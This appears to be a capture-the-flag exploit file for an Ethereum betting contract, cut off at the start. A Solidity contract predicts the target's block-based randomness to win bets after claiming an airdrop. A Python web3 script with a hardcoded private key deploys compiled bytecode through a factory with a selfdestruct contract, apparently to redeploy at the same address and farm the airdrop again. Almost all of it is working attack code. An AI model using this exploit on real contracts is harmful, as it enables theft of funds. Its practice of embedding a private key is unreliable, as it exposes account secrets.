}
contract exp{
    function get_rand(uint256 nonce) public view returns(uint256){
        uint256 mod = 12;
        uint256 rand = uint256(
            keccak256(
                abi.encodePacked(
                    nonce,
                    block.timestamp,
                    block.difficulty,
                    address(this)
                )
            )
        ) % mod;
        return rand;
    }
    event log_balance(uint256);
    constructor(uint256 nonce) public{
        BetToken target = BetToken(0xd9145CCE52D386f254917e481eB44e9943F39138);
        uint256 balance=target.balances(address(this));
        uint256 random;
        emit log_balance(balance);  
        target.airdrop();
        random = get_rand(nonce);
        target.bet(random,12);
        balance = target.balances(address(this));
        emit log_balance(balance); 
        // selfdestruct(payable(0));
    }
}
contract another{
    event self(string);
    function destroy() public {
        emit self("selfdestruct");
        selfdestruct(payable(0));
    }
}
import sha3
from web3 import Web3, HTTPProvider
w3 = Web3(Web3.HTTPProvider(''))
priv_key = "802d86d9167f48b1c7f927f6247ccf56ed4c754b1be0b179867444f491a3a212" 
my_account = w3.eth.account.from_key(priv_key)
# print(my_account.address)
abi = [
  {
    "anonymous": False,
    "inputs": [
      {
        "indexed": False,
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "name": "deploy_addr",
    "type": "event"
  },
  {
    "inputs": [
      {
        "internalType": "bytes",
        "name": "code",
        "type": "bytes"
      },
      {
        "internalType": "uint256",
        "name": "_nonce",
        "type": "uint256"
      },
      {
        "internalType": "uint256",
        "name": "_round",
        "type": "uint256"
      }
    ],
    "name": "deploy",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "deployBytecode",
    "outputs": [
      {
        "internalType": "bytes",
        "name": "",
        "type": "bytes"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "deployedAddr",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "nonce",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "round",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  }
]
bytecode = 
0x608060405234801561001057600080fd5b50611269806100206000396000f3fe608060405234801561001
057600080fd5b50600436106100575760003560e01c8063146ca5311461005c57806331d191661461007a57
806391e7e5b414610098578063affed0e0146100b4578063d1524f74146100d2575b600080fd5b610064610
0f0565b60405161007191906106ac565b60405180910390f35b6100826100f6565b60405161008f91906106
6a565b60405180910390f35b6100b260048036038101906100ad919061051e565b610184565b005b6100bc6
103ca565b6040516100c991906106ac565b60405180910390f35b6100da6103d0565b6040516100e7919061
064f565b60405180910390f35b60035481565b60008054610103906107d3565b80601f01602080910402602
0016040519081016040528092919081815260200182805461012f906107d3565b801561017c5780601f1061
01515761010080835404028352916020019161017c565b820191906000526020600020905b8154815290600
1019060200180831161015f57829003601f168201915b505050505081565b82600090805190602001906101
9a9291906103f6565b50816002819055508060038190555060008060405180610960016040528061093a815
26020016108fa61093a9139905061945381518260200134f5915081600160006101000a81548173ffffffff
ffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160
2179055507f573fc86bc4f5ed8d7250fbeebeef1a9678861dc81694ddb08b5b82a4bb3bb726600160009054
906101000a900473ffffffffffffffffffffffffffffffffffffffff16604051610269919061064f565b604
05180910390a16000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16
73ffffffffffffffffffffffffffffffffffffffff166040516024016040516020818303038152906040527
f83197ef0000000000000000000000000000000000000000000000000000000007bffffffffffffffffffff
ffffffffffffffffffffffffffffffffffff19166020820180517bfffffffffffffffffffffffffffffffff
fffffffffffffffffffffff838183161783525050505060405161033c9190610638565b6000604051808303
816000865af19150503d8060008114610379576040519150601f19603f3d011682016040523d82523d60006
02084013e61037e565b606091505b50509050806103c2576040517f08c379a0000000000000000000000000
0000000000000000000000000000000081526004016103b99061068c565b60405180910390fd5b505050505
050565b60025481565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff
1681565b828054610402906107d3565b90600052602060002090601f0160209004810192826104245760008
55561046b565b82601f1061043d57805160ff191683800117855561046b565b828001600101855582156104
6b579182015b8281111561046a57825182559160200191906001019061044f565b5b5090506104789190610
47c565b5090565b5b8082111561049557600081600090555060010161047d565b5090565b60006104ac6104
a7846106ec565b6106c7565b9050828152602081018484840111156104c8576104c7610899565b5b6104d38
48285610791565b509392505050565b600082601f8301126104f0576104ef610894565b5b81356105008482
60208601610499565b91505092915050565b600081359050610518816108e2565b92915050565b600080600
060608486031215610537576105366108a3565b5b600084013567ffffffffffffffff811115610555576105
5461089e565b5b610561868287016104db565b935050602061057286828701610509565b925050604061058
386828701610509565b9150509250925092565b61059681610755565b82525050565b60006105a78261071d
565b6105b18185610728565b93506105c18185602086016107a0565b6105ca816108a8565b8401915050929
15050565b60006105e08261071d565b6105ea8185610739565b93506105fa8185602086016107a0565b8084
0191505092915050565b6000610613600983610744565b915061061e826108b9565b6020820190509190505
65b61063281610787565b82525050565b600061064482846105d5565b915081905092915050565b60006020
82019050610664600083018461058d565b92915050565b60006020820190508181036000830152610684818
461059c565b905092915050565b600060208201905081810360008301526106a581610606565b9050919050
565b60006020820190506106c16000830184610629565b92915050565b60006106d16106e2565b90506106d
d8282610805565b919050565b6000604051905090565b600067ffffffffffffffff82111561070757610706
610865565b5b610710826108a8565b9050602081019050919050565b600081519050919050565b600082825
260208201905092915050565b600081905092915050565b600082825260208201905092915050565b600061
076082610767565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919
050565b6000819050919050565b82818337600083830152505050565b60005b838110156107be5780820151
818401526020810190506107a3565b838111156107cd576000848401525b50505050565b600060028204905
060018216806107eb57607f821691505b602082108114156107ff576107fe610836565b5b50919050565b61
080e826108a8565b810181811067ffffffffffffffff8211171561082d5761082c610865565b5b806040525
05050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260
045260246000fd5b7f4e487b710000000000000000000000000000000000000000000000000000000060005
2604160045260246000fd5b600080fd5b600080fd5b600080fd5b600080fd5b6000601f19601f8301169050
919050565b7f63616c6c206661696c000000000000000000000000000000000000000000000060008201525
0565b6108eb81610787565b81146108f657600080fd5b5056fe60806040523480156200001157600080fd5b
50600033905060008173ffffffffffffffffffffffffffffffffffffffff166331d191666040518163fffff
fff1660e01b815260040160006040518083038186803b1580156200006057600080fd5b505afa1580156200
0075573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f8201168201806040525081019
0620000a091906200055f565b905060008273ffffffffffffffffffffffffffffffffffffffff1663affed0
e06040518163ffffffff1660e01b815260040160206040518083038186803b158015620000eb57600080fd5
b505afa15801562000100573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052
50810190620001269190620005b0565b905060008373ffffffffffffffffffffffffffffffffffffffff166
3146ca5316040518163ffffffff1660e01b815260040160206040518083038186803b158015620001715760
0080fd5b505afa15801562000186573d6000803e3d6000fd5b505050506040513d601f19601f82011682018
060405250810190620001ac9190620005b0565b9050620001c08282620001c860201b60201c565b82516020
8401f35b60007321ac0df70a628cdb042dde6f4eb6cf49bde00ff7905060008173fffffffffffffffffffff
fffffffffffffffffff166327e235e3306040518263ffffffff1660e01b81526004016200021e9190620006
a1565b602060405180830381600087803b1580156200023957600080fd5b505af11580156200024e573d600
0803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620002749190620005b0
565b905060007feb8f8e6e6aec6c492f2d95e709ac2e3d0583d00beb28f62e0b1b014d4a7398f2826040516
20002a99190620006be565b60405180910390a160008414156200031e578273ffffffffffffffffffffffff
ffffffffffffffff16633884d6356040518163ffffffff1660e01b815260040160006040518083038160008
7803b1580156200030457600080fd5b505af115801562000319573d6000803e3d6000fd5b505050505b6200
032f856200047660201b60201c565b90508273ffffffffffffffffffffffffffffffffffffffff16636ffcc
71982600c6040518363ffffffff1660e01b81526004016200036f929190620006db565b6000604051808303
81600087803b1580156200038a57600080fd5b505af11580156200039f573d6000803e3d6000fd5b5050505
08273ffffffffffffffffffffffffffffffffffffffff166327e235e3306040518263ffffffff1660e01b81
52600401620003de9190620006a1565b602060405180830381600087803b158015620003f957600080fd5b5
05af11580156200040e573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250
810190620004349190620005b0565b91507feb8f8e6e6aec6c492f2d95e709ac2e3d0583d00beb28f62e0b1
b014d4a7398f282604051620004679190620006be565b60405180910390a15050505050565b600080600c90
50600081844244306040516020016200049994939291906200064b565b60405160208183030381529060405
28051906020012060001c620004be919062000857565b90508092505050919050565b6000620004e1620004
db8462000731565b62000708565b9050828152602081018484840111156200050057620004ff620008f2565
b5b6200050d848285620007b9565b509392505050565b600082601f8301126200052d576200052c620008ed
565b5b81516200053f848260208601620004ca565b91505092915050565b600081519050620005598162000
91f565b92915050565b600060208284031215620005785762000577620008fc565b5b600082015167ffffff
ffffffffff811115620005995762000598620008f7565b5b620005a78482850162000515565b91505092915
050565b600060208284031215620005c957620005c8620008fc565b5b6000620005d9848285016200054856
5b91505092915050565b620005ed8162000767565b82525050565b62000608620006028262000767565b620
00825565b82525050565b6200061981620007a5565b82525050565b6200062a816200079b565b8252505056
5b620006456200063f826200079b565b6200084d565b82525050565b600062000659828762000630565b602
0820191506200066b828662000630565b6020820191506200067d828562000630565b602082019150620006
8f8284620005f3565b60148201915081905095945050505050565b6000602082019050620006b8600083018
4620005e2565b92915050565b6000602082019050620006d560008301846200061f565b92915050565b6000
604082019050620006f260008301856200061f565b6200070160208301846200060e565b9392505050565b6
0006200071462000727565b9050620007228282620007ef565b919050565b6000604051905090565b600067
ffffffffffffffff8211156200074f576200074e620008be565b5b6200075a8262000901565b90506020810
19050919050565b600062000774826200077b565b9050919050565b600073ffffffffffffffffffffffffff
ffffffffffffff82169050919050565b6000819050919050565b6000620007b2826200079b565b905091905
0565b60005b83811015620007d9578082015181840152602081019050620007bc565b83811115620007e957
6000848401525b50505050565b620007fa8262000901565b810181811067ffffffffffffffff82111715620
0081c576200081b620008be565b5b80604052505050565b6000620008328262000839565b9050919050565b
6000620008468262000912565b9050919050565b6000819050919050565b600062000864826200079b565b9
15062000871836200079b565b9250826200088457620008836200088f565b5b828206905092915050565b7f
4e487b710000000000000000000000000000000000000000000000000000000060005260126004526024600
0fd5b7f4e487b71000000000000000000000000000000000000000000000000000000006000526041600452
60246000fd5b600080fd5b600080fd5b600080fd5b600080fd5b6000601f19601f8301169050919050565b6
0008160601b9050919050565b6200092a816200079b565b81146200093657600080fd5b5056fea264697066
73582212208ec6dedf669c3552be939ce0ee67cff145fd9715c53ebb3d3f818035d3c3d10f64736f6c63430
008070033
# # deploy
# newContract = w3.eth.contract(bytecode=bytecode, abi=abi)
# tx = newContract.constructor().buildTransaction()
# print(tx["data"])
# def transact(tx):
#     tx["chainId"] = w3.eth.chain_id
#     signed_tx = my_account.sign_transaction(tx).rawTransaction
#     txid = w3.eth.send_raw_transaction(signed_tx)
#     print(txid.hex())
# transact(
#     {
#         "value": 0,
#         "nonce": w3.eth.get_transaction_count(my_account.address),
#         "gas": 3000000,
#         "from": my_account.address,
#         "gasPrice": 1,
#         "data": tx["data"],
#     },
# )
# call 
contract_addr = "0x135dc4190E10F4E4C656dCb57C4F07e2fa3561e1"
contract = w3.eth.contract(address=contract_addr,abi=abi)
another_bytecode = 
"0x6080604052348015600f57600080fd5b506004361060285760003560e01c806383197ef014602d575b60
0080fd5b60336035565b005b7ff7868bd2e9c7123cbb038694bc46968b16a57633e7bbf7f41db735f4d1321
1f360405160609060a1565b60405180910390a1600073ffffffffffffffffffffffffffffffffffffffff16
ff5b6000608d600c8360bf565b915060968260d0565b602082019050919050565b600060208201905081810
3600083015260b8816082565b9050919050565b600082825260208201905092915050565b7f73656c666465
737472756374000000000000000000000000000000000000000060008201525056fea264697066735822122
0a740aaeb1a77f57fbd7617ed7e0085876cdf16276b8e13d9743abce1116d8d1964736f6c63430008070033
"
tx = contract.functions.deploy(another_bytecode,0x103,1).buildTransaction()
print(tx["data"])
def transact(tx):
    tx["chainId"] = w3.eth.chain_id
    signed_tx = my_account.sign_transaction(tx).rawTransaction
    txid = w3.eth.send_raw_transaction(signed_tx)
    print(txid.hex())
transact(
    {
        "value": 0,
        "nonce": w3.eth.get_transaction_count(my_account.address),
        "gas": 3000000,
        "from": my_account.address,
        "to": contract_addr,
        "gasPrice": 1,
        "data": tx["data"],
    },
)